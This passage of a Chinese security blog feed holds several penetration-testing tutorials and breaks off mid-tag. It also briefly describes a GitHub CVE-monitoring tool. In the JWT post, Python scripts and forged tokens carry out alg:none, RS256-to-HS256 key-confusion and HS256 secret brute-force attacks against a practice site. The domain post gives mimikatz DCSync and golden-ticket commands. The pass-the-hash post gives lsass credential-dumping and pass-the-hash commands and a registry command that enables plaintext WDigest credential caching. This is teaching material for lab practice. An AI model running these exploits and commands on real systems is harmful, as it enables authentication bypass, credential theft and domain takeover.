token 发给服务端后，服务端可以把其中的头部和载荷再加上事先的 secret 再进行一次 HMAC 加密，得到的结果和 token 的第三段进行对比，如果一样则表明数据没有被篡改。</p><p>  注意：secret是保存在服务器端的，jwt的签发生成也是在服务器端的，secret就是用来进行jwt的签发和jwt的验证，所以，它就是你服务端的私钥，在任何场景都不应该流露出去。一旦客户端得知这个secret, 那就意味着客户端是可以自我签发jwt了。</p></blockquote><p>看一张图就明白了：<a href="https://jwt.io/">https://jwt.io/</a></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210305142735.png" alt="image-20210305142629387"></p><h2 id="0x03-渗透测试中的JWT"><a href="#0x03-渗透测试中的JWT" class="headerlink" title="0x03 渗透测试中的JWT"></a>0x03 渗透测试中的JWT</h2><h4 id="3-1-敏感信息泄露"><a href="#3-1-敏感信息泄露" class="headerlink" title="3.1 敏感信息泄露"></a>3.1 敏感信息泄露</h4><p>显然，由于有效载荷是以明文(<code>Base64url</code>只是一种编码方式)形式传输的，因此，如果有效载荷中存在敏感信息的话，就会发生信息泄露。</p><h4 id="3-2-将签名算法改为none"><a href="#3-2-将签名算法改为none" class="headerlink" title="3.2 将签名算法改为none"></a>3.2 将签名算法改为none</h4><p>签名算法可以确保JWT在传输过程中不会被恶意用户所篡改，但头部中的<code>alg</code>字段却可以改为<code>none</code>。</p><p>另外，一些JWT库也支持none算法，即不使用签名算法。当alg字段为空时，后端将不执行签名验证。</p><p>将alg字段改为none后，系统就会从JWT中删除相应的签名数据（这时，JWT就会只含有头部 + ‘.’ + 有效载荷 + ‘.’），然后将其提交给服务器。</p><p>靶场：<a href="https://github.com/Sjord/jwtdemo/">https://github.com/Sjord/jwtdemo/</a></p><p>以 <a href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</a> 靶场作为实验</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210305170239.png" alt="image-20210305164337558"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTYxNDkzMzgwMywiZXhwIjoxNjE0OTM1MDAzLCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.leCmAQCAuPZiAnnZLj6yUvL2WJ2R9oXZAgvtg04cRC8<br></code></pre></td></tr></table></figure><p>如图，当前 jwt 指定的 alg 为 HS256 算法</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210305170247.png" alt="image-20210305164732797"></p><p>取出JWT中的头部<code>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9</code>解码后，将算法<code>HS256</code>改为<code>none</code>,再使用<code>Base64url</code>编码，结果为 <code>ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0</code> ，将结果替换原始的header，再加上自己修改好的载荷(payload)，然后删除签名，但<strong>保留最后一个点</strong>，将其发送到演示页面，看 server 端是否接受 none 算法，从而绕过了算法签名。</p><blockquote><p>  <a href="https://jwt.io/">https://jwt.io/</a> 将 alg 为 none 视为恶意行为，所以，无法通过在线工具生成 JWT, 可以自己用<code>Base64url</code>编码后组合，也可以使用下面代码</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs apl">#!&#x2F;usr&#x2F;bin&#x2F;python3<br># -*- coding:utf-8 -*-<br># @Author : yhy<br>import jwt<br><br>print(jwt.encode(&#123;<br>&quot;iss&quot;: &quot;http:&#x2F;&#x2F;demo.sjoerdlangkemper.nl&#x2F;&quot;,<br>&quot;iat&quot;: 1614933803,<br>&quot;exp&quot;: 1614935003,<br>&quot;data&quot;: &#123;<br>&quot;hello&quot;: &quot;world&quot;<br>&#125;<br>&#125;, key&#x3D;&#39;&#39;, algorithm&#x3D;&#39;none&#39;))<br></code></pre></td></tr></table></figure><blockquote><p>另外，某些 JWT 实现对大小写敏感，所以，当none不通过时，可以继续尝试 None、nOne、NONE等等。上述代码只支持none，其它的请自行使用<code>Base64url</code>编码。</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">ewogICJ0eXAiOiAiSldUIiwKICAiYWxnIjogIm5vbmUiCn0.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTYxNDkzMzgwMywiZXhwIjoxNjE0OTM1MDAzLCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.<br></code></pre></td></tr></table></figure><p>攻击成功</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210305170252.png" alt="image-20210305170222663"></p><h4 id="3-3-非对称加密向下降级为对称加密（将RS256算法改为HS256）"><a href="#3-3-非对称加密向下降级为对称加密（将RS256算法改为HS256）" class="headerlink" title="3.3 非对称加密向下降级为对称加密（将RS256算法改为HS256）"></a>3.3 非对称加密向下降级为对称加密（将RS256算法改为HS256）</h4><p>现在大多数应用使用的算法方案都采用 RSA 非对称加密，server 端保存私钥，用来签发 jwt，对传回来的 jwt 使用公钥解密验证。</p><p>如果后端的验证是根据header的alg选择算法，并且支持 HS256 对称加密算法， 碰到这种情况，我们可以修改 alg 为 HS256 对称加密算法，然后使用我们可以获取到的公钥作为 key 进行签名加密（ps：在靶场中我们是直接获取，在实战中，如果是对客户进行服务的话，我们可以让客户提供公钥，毕竟只是一个公钥，为了详细测出系统漏洞，这应该是被允许的，另一个可能的来源是服务器的TLS证书，从证书中导出公钥），这样一来，当我们将 jwt 传给 server 端的时候，server 端因为默认使用的是公钥解密，而算法为修改后的 HS256 对称加密算法，此时即不存在公钥私钥问题，因为对称密码算法只有一个key，所以肯定可以正常解密解析，从而绕过了算法限制。</p><p>当 server 端严格指定只允许使用 HMAC 或者 RSA 算法其中一种时候，那这种攻击手段是没有效果的。</p><p>使用靶场进行此次攻击 <a href="http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/rs256.php</a> 这是<code>RS256</code>加密</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306151931.png" alt="image-20210306151929356"></p><p>从源码中，我们也可以看到它需要一个RS256签名，但也接受一个HS256签名。</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306151650.png" alt="image-20210306151610286"></p><p>靶场的公钥获取：<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem">http://demo.sjoerdlangkemper.nl/jwtdemo/public.pem</a> </p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210305172816.png" alt="image-20210305172812817"></p><p>将公钥保存为<code>public.pem</code>，<strong>一定要在最后空一行</strong>、<strong>一定要在最后空一行</strong>、<strong>一定要在最后空一行</strong>，重要的事情说三遍</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306152239.png" alt="image-20210306151222844"></p><p>运行脚本（打靶场时请将{…}中的值修改，如果您现在提交，它将失败，因为它已经过期）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-comment"># @Author : yhy</span><br><span class="hljs-comment"># jwt 非对称加密，改为对称加密 ，需要公钥</span><br><span class="hljs-keyword">import</span> jwt<br><br>public = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;public.pem&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>).read() <span class="hljs-comment"># 公钥</span><br>print(jwt.encode(&#123;<br>  <span class="hljs-string">&quot;iss&quot;</span>: <span class="hljs-string">&quot;http://demo.sjoerdlangkemper.nl/&quot;</span>,<br>  <span class="hljs-string">&quot;iat&quot;</span>: <span class="hljs-number">1615015143</span>,<br>  <span class="hljs-string">&quot;exp&quot;</span>: <span class="hljs-number">1615016343</span>,<br>  <span class="hljs-string">&quot;data&quot;</span>: &#123;<br>    <span class="hljs-string">&quot;JWT&quot;</span>: <span class="hljs-string">&quot;RS256 -&gt; HS256 test &quot;</span><br>  &#125;<br>&#125;, key=public, algorithm=<span class="hljs-string">&#x27;HS256&#x27;</span>))<br></code></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apl">python3 -m pip install PyJWT<br>python3 jwt_test.py<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306152213.png" alt="image-20210305211926691"></p><p>如果出现以上错误，请执行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apl">python3 -m pip uninstall jwt<br>python3 -m pip uninstall PyJWT<br>python3 -m pip install PyJWT<br></code></pre></td></tr></table></figure><p>运行</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306152614.png" alt="image-20210305213239054"></p><p>查资料说是因为jwt模块更新后，为了防止滥用，加入了强校验，如果指定算法为 HS256 而提供 RSA 的公钥作为 key 时会报错，无法往下执行，需要注释掉 <strong>site-packages/jwt/algorithms.py</strong> 中的如下五行：</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306152610.png" alt="image-20210305213418057"></p><p>成功运行</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306152104.png" alt="image-20210306152103157"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOi8vZGVtby5zam9lcmRsYW5na2VtcGVyLm5sLyIsImlhdCI6MTYxNTAxNTE0MywiZXhwIjoxNjE1MDE2MzQzLCJkYXRhIjp7IkpXVCI6IlJTMjU2IC0-IEhTMjU2IHRlc3QgIn19.HWN7y4FVaRZMNHiCWwcGuEOruLpPYKw_UOtNj4iXbC8<br></code></pre></td></tr></table></figure><p>提交JWT，攻击成功</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306152109.png" alt="image-20210306152039256"></p><h4 id="3-4-暴力破解密钥"><a href="#3-4-暴力破解密钥" class="headerlink" title="3.4 暴力破解密钥"></a>3.4 暴力破解密钥</h4><p>当 alg 指定 HMAC 类对称加密算法时，可以进行针对 key 的暴力破解，比如当算法为HS256，HS256算法使用密钥对消息进行签名和验证，如果知道密钥，则可以创建自己的签名消息。所有当密钥不够牢固时，则可以使用蛮力或<a href="https://github.com/wallarm/jwt-secrets">字典</a>攻击将其破解。</p><p>靶场：<a href="http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php">http://demo.sjoerdlangkemper.nl/jwtdemo/hs256.php</a></p><p>使用python脚本进行字典破解，将下方的 jwt_json 换成自己的值，字典可以从 <a href="https://github.com/wallarm/jwt-secrets">https://github.com/wallarm/jwt-secrets</a> 获取 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python3</span><br><span class="hljs-comment"># -*- coding:utf-8 -*-</span><br><span class="hljs-comment"># @Author : yhy</span><br><span class="hljs-comment"># jwt 暴力破解脚本</span><br><br><span class="hljs-keyword">import</span> jwt<br><br>jwt_json=<span class="hljs-string">&#x27;eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpc3MiOiJodHRwOlwvXC9kZW1vLnNqb2VyZGxhbmdrZW1wZXIubmxcLyIsImlhdCI6MTYxNTAyMTAzNiwiZXhwIjoxNjE1MDIyMjM2LCJkYXRhIjp7ImhlbGxvIjoid29ybGQifX0.x_ENVoZZRSDnjUqKHOAOYvTDrAtzfLw-_i02Qqry7so&#x27;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;jwt.secrets.list&#x27;</span>, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f:<br>        key = line.strip()<br>        <span class="hljs-keyword">try</span>:<br>            jwt.decode(jwt_json, verify=<span class="hljs-literal">True</span>, key=key, algorithms=<span class="hljs-string">&#x27;HS256&#x27;</span>)<br>            print(<span class="hljs-string">&#x27;found key! --&gt; &#x27;</span> +  key)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>(jwt.exceptions.ExpiredSignatureError, jwt.exceptions.InvalidAudienceError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.InvalidIssuedAtError, jwt.exceptions.ImmatureSignatureError):<br>            print(<span class="hljs-string">&#x27;found key! --&gt; &#x27;</span> +  key)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">except</span>(jwt.exceptions.InvalidSignatureError):<br>            print(<span class="hljs-string">&#x27;verify key! --&gt;&#x27;</span> + key)<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        print(<span class="hljs-string">&quot;key not found!&quot;</span>)<br></code></pre></td></tr></table></figure><p>运行</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306170654.png" alt="image-20210306165921066"></p><p>爆破出密钥为：<code>secret</code>，借助 <a href="https://jwt.io/#debugger">https://jwt.io/#debugger</a>  即可进行消息的恶意伪造，篡改，</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306170702.png" alt="image-20210306165956842"></p><p>将左侧 jwt 复制发送，攻击成功</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210306170715.png" alt="image-20210306170013690"></p><p>字典跑不出时，还可以使用 <a href="https://github.com/brendan-rius/c-jwt-cracker">https://github.com/brendan-rius/c-jwt-cracker</a>  工具进行暴力破解</p>]]></content>
    
    
    <categories>
      
      <category>Web渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Web渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>gitHub_cve_monitor</title>
    <link href="/2021/02/25/github_cve_monitor/"/>
    <url>/2021/02/25/github_cve_monitor/</url>
    
    <content type="html"><![CDATA[<blockquote><p>没事少矫情，有空多赚钱。</p></blockquote><h2 id="监控github上新增的cve编号项目漏洞，推送钉钉或者server酱"><a href="#监控github上新增的cve编号项目漏洞，推送钉钉或者server酱" class="headerlink" title="监控github上新增的cve编号项目漏洞，推送钉钉或者server酱"></a>监控github上新增的cve编号项目漏洞，推送钉钉或者server酱</h2><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>项目地址：<a href="https://github.com/yhy0/github-cve-monitor.git">https://github.com/yhy0/github-cve-monitor.git</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">python3 -m pip install dingtalkchatbot<br>python3 github_cve_monitor.py<br></code></pre></td></tr></table></figure><p>每3分钟检测一次github是否有新的cve漏洞提交记录，若有则通过server酱和钉钉机器人推送（二者配置一个即可）</p><p>时间间隔修改在 58 行</p><p>建议使用<a href="https://www.runoob.com/linux/linux-comm-screen.html">screen命令</a>运行在自己的linux vps后台上，就可以愉快的接收各种cve了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">screen -S github_cve<span class="hljs-comment">#创建一个screen，名字为github_cve，在新窗口运行本项目, 成功后直接叉掉该窗口, 项目就会在后台一直运行了</span><br><br>screen -ls <span class="hljs-comment">#查看创建的screen</span><br><br>screen -r github_cve<span class="hljs-comment">#连接github_cve后台screen，如果存在的话</span><br></code></pre></td></tr></table></figure><p>钉钉机器人配置在 33行的 dingding函数中，需要钉钉建群，添加钉钉机器人，复制 webhook 替换即可</p><p>server酱配置在 40行的 server 函数中，ps：因微信的原因，server酱的旧版将在2021年4月后下线，新版以企业微信为主，这里使用的是旧版，想改新版的话，搞个企业微信，从新配置server酱，使用新链接 sctapi.ftqq.com</p><p>具体查看server酱官方，<a href="http://sc.ftqq.com/">http://sc.ftqq.com/</a> ，配置简单，只需要将脚本中的uri换掉即可</p><p><a href="https://sct.ftqq.com/">server酱新版</a>支持多通道（微信、客户端、群机器人、邮件和短信）</p><h2 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h2><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210225093627.png" alt="image-20210225090416314"></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210225094630.jpg" alt="751614217534_.pic"></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210225093635.png" alt="image-20210225092350481"></p><p>项目地址：<a href="https://github.com/yhy0/github-cve-monitor.git">https://github.com/yhy0/github-cve-monitor.git</a></p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul><li>  洛米唯熊     <a href="https://my.oschina.net/u/4581868/blog/4380482">https://my.oschina.net/u/4581868/blog/4380482</a></li><li>  kiang70      <a href="https://github.com/kiang70/Github-Monitor">https://github.com/kiang70/Github-Monitor</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>GitHub工具</category>
      
    </categories>
    
    
    <tags>
      
      <tag>GitHub工具</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透-DCSync和黄金票据</title>
    <link href="/2021/02/21/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/"/>
    <url>/2021/02/21/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync%E5%92%8C%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE/</url>
    
    <content type="html"><![CDATA[<blockquote><p>  新年开工快乐～～～</p></blockquote><h1 id="域渗透-DCSync和黄金票据"><a href="#域渗透-DCSync和黄金票据" class="headerlink" title="域渗透-DCSync和黄金票据"></a>域渗透-DCSync和黄金票据</h1><h2 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h2><blockquote><p>krbtgt账户：每个域控制器都有一个”krbtgt”的用户账户，是KDC的服务账户，用来创建票据授予服务（TGS）  加密的密钥。</p><p>黄金票据（Golden Ticket）：它能让黑客在拥有普通域用户权限和krbtgt hash的情况下，获取域管理员权限。</p><p>DCSync：mimikatz中的功能，能够模拟域控制器并从域控制器导出帐户密码hash。</p></blockquote><p>在域内，不同DC之间，每15分钟都会有一次域数据的同步。实现不登录到域控制器上，而获取域控制器数据库中的数据。</p><p>在DCSync功能出现之前，要想获得域用户的哈希，需要登录域控制器，在域控制器上执行代码才能获得域用户的哈希。2015年8月，新版的mimikatz增加了DCSync的功能，该功能可以模仿一个域控DC，从真实的域控中请求数据，如用户的哈希。该功能最大的特点就是在于不用登陆域服务器，即可远程通过域数据同步复制的方式获得想要的用户口令信息。</p><p>需要注意的是，DCSync攻击的对象如果是只读域控制器(RODC)，则会失效，因为RODC是不能参与复制同步数据到其他DC的。 </p><p>DCSync的原理非常清晰，利用域控制器之间的数据同步复制：</p><ul><li><p>  发现网络中的目标域控制器</p></li><li><p>通过DRS服务的GetNCChanges接口发起数据同步请求，Directory Replication Service（DRS）Remote Protocol</p><blockquote><p>GetNCChanges：当一个DC（成为客户端DC）想从其他DC（成为服务端DC）获取数据时，客户端DC会向服务端DC发起一个GetNCChanges请求。回应的数据包括需要同步的数据。如果需要同步的数据比较多，则会重复上述过程，毕竟每次回应的数据有限。</p></blockquote></li></ul><p>默认情况下，只有和Domain Controllers和Enterprise Domain Admins权限能够使用DCSync，但我们可以对域内普通用户添加ACL(Access Control List)实现普通用户调用DCSync导出域内所有用户的hash。</p><h2 id="0x02-利用DCSync导出域内用户Hash"><a href="#0x02-利用DCSync导出域内用户Hash" class="headerlink" title="0x02 利用DCSync导出域内用户Hash"></a>0x02 利用DCSync导出域内用户Hash</h2><h4 id="利用条件：获得以下任一的权限"><a href="#利用条件：获得以下任一的权限" class="headerlink" title="利用条件：获得以下任一的权限"></a>利用条件：获得以下任一的权限</h4><ul><li>  Administrators组内的用户</li><li>  Domain Admins组内的用户</li><li>  Enterprise Admins组内的用户</li><li>  域控制器的计算机帐户</li></ul><h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>利用DRS(Directory Replication Service)协议通过IDL_DRSGetNCChanges从域控制器复制用户凭据。</p><p>获取相应权限后(这里实验的是域内机器win7，域控为win8上，登录的域内用户yhy)</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210221224807.png" alt="image-20210221165619981"></p><h4 id="使用mimikatz导出指定域用户的信息-包括哈希"><a href="#使用mimikatz导出指定域用户的信息-包括哈希" class="headerlink" title="使用mimikatz导出指定域用户的信息(包括哈希)"></a>使用<code>mimikatz</code>导出指定域用户的信息(包括哈希)</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apl">lsadump::dcsync &#x2F;domain:test.yhy &#x2F;user:administrator &#x2F;csv<br>lsadump::dcsync &#x2F;domain:test.yhy &#x2F;user:administrator<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210221224813.png" alt="image-20210221171218395"></p><p>获得了域内用户的hash后，进一步利用可参考之前的文章：<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483885&idx=1&sn=edaa58066c4128f53adae0d8f048bff7&chksm=c28298f4f5f511e2e3fc11813896af4f457ba302ee52911562bedac8dd8977fd748e7b9a1982#rd">哈希传递攻击</a></p><h2 id="0x03生成黄金票据，获取域管理权限"><a href="#0x03生成黄金票据，获取域管理权限" class="headerlink" title="0x03生成黄金票据，获取域管理权限"></a>0x03生成黄金票据，获取域管理权限</h2><p>获取<code>krbtgt</code>（域内默认创建的账号）账户Hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">lsadump::dcsync &#x2F;domain:test.yhy &#x2F;user:krbtgt &#x2F;csv<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210221224823.png" alt="image-20210221223933475"></p><p>生成黄金票据，并使用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apl">kerberos::golden &#x2F;krbtgt:8a4f49ff2d2eedf30b5e565e4332d0b5 &#x2F;admin:administrator &#x2F;domain:test.yhy &#x2F;sid:S-1-5-21-2604854395-1602356619-879117556-502 &#x2F;ticket:administrator.ticket.bin<br><br>kerberos::ptt administrator.ticket.bin<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210221224829.png" alt="image-20210221223253549"></p><p>提升到域管理权限成功</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210221224837.png" alt="image-20210221223505092"></p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210221224841.png" alt="image-20210221223535054"></p><h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><p>DCSync攻击的原理是模拟域控制器发起服务器之间的数据同步复制。最好的防御方法是给控制器设置白名单，在域内，域控制器的数量、IP地址、MAC地址是非常明确清晰的资产，将这些资产设置在允许同步的白名单内。非白名单的IP不允许发生数据同步。</p>]]></content>
    
    
    <categories>
      
      <category>域渗透</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows提权</tag>
      
      <tag>域渗透</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>哈希传递</title>
    <link href="/2021/02/14/%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/"/>
    <url>/2021/02/14/%E5%93%88%E5%B8%8C%E4%BC%A0%E9%80%92%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<blockquote><p>  笙歌间错华筵启。喜新春新岁。菜传纤手青丝细。和气入、东风里。</p><p>  幡儿胜儿都姑媂。戴得更忔戏。愿新春以后，吉吉利利，百事都如意。 </p></blockquote><h2 id="0x01-哈希传递攻击概念"><a href="#0x01-哈希传递攻击概念" class="headerlink" title="0x01 哈希传递攻击概念"></a>0x01 哈希传递攻击概念</h2><p>在域环境中，用户登录计算机时使用的大都是域账号，大量计算机在安装时会使用相同的本地管理员账号和密码，因此，如果计算机的本地管理员账号和密码也是相同的，攻击者就能使用哈希传递攻击的方法登陆内网中的其他计算机。</p><p>在Windows系统中，通常会使用NTLM身份认证，NTLM认证不使用明文口令，而是使用口令加密后的hash值，hash值由系统API生成(例如LsaLogonUser)。攻击者获得有效的用户名和用户密码哈希值后，他们便能够使用该信息通过LM或NTLM身份验证向远程服务器或服务进行身份验证，而无需进行<strong>暴力破解</strong>散列以获取明文密码（此技术发布之前需要此密码）。该攻击利用了身份验证协议中的一种实现缺陷，即每次<strong>会话之间</strong>的密码散列保持静态，直到下次更改密码为止。</p><p>从Windows Vista和Windows Server 2008开始，微软默认禁用LM hash。在Windows Server 2012 R2及之后版本的操作系统中，默认不会在内存中保存明文密码，Mimikatz 就读不到密码明文，只能读取哈希值。虽然此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。修改注册表命令为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apl">reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest &#x2F;v UseLogonCredential &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f<br></code></pre></td></tr></table></figure><p>但是，这种方式要求系统重启或者用户重新登录，在实战中操作起来成功率还是比较低的。如果攻击者拥有用户密码的哈希值，则无需强行使用明文密码；他们可以简单地使用他们已经收获的任意用户帐户的哈希值来针对远程系统进行身份验证并模拟该用户。换句话说，从攻击者的角度来看，哈希在功能上等同于生成它们的原始密码。</p><p>因此，攻击者如果使用工具将散列值传递到其他计算机中，进行权限验证，就能够在身份验证的时候模拟该用户(即跳过调用API生成hash的过程)，实现对计算机的控制。</p><h2 id="0x02-利用方法"><a href="#0x02-利用方法" class="headerlink" title="0x02 利用方法"></a>0x02 利用方法</h2><h3 id="环境搭配"><a href="#环境搭配" class="headerlink" title="环境搭配"></a>环境搭配</h3><p>域搭建可以参考<a href="http://mp.weixin.qq.com/s?__biz=MzkzODIwMTIwNg==&mid=2247483820&idx=1&sn=f49f393a5698e366df99ddd0d9269829&chksm=c28298b5f5f511a36cd92fb722ce3b0658a9ee6195f5ad3f89266a4dc2ac3f022fdc8d5b578e#rd">Windows组策略提权实验</a></p><p>将一台win7添加到域控（win8）中</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160244.png" alt="image-20210214145116625"></p><p>登录一下域账户，之后退出域账户，然后切换为本地账户</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160250.png" alt="image-20210214145726732"></p><p>切换本地账户</p><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160257.png" alt="image-20210214145957319"></p><h3 id="Mimikatz-交互式获取"><a href="#Mimikatz-交互式获取" class="headerlink" title="Mimikatz 交互式获取"></a>Mimikatz 交互式获取</h3><p>读取lsass进程的信息，获取hash</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apl">privilege::debug<br>sekurlsa::logonPasswords<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/yhy0/pic-go-img/raw/master/WX/20210214160302.png" alt="image-20210214152209729"></p><p>获取终端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apl">privilege::debug<br>sekurlsa::pth &#x2F;user:administrator &#x2F;domain:workgroup &#x2F;ntlm:4075bdc2e63781b034a034102356063a<br></code></pre></td></tr></table></figure><p><img 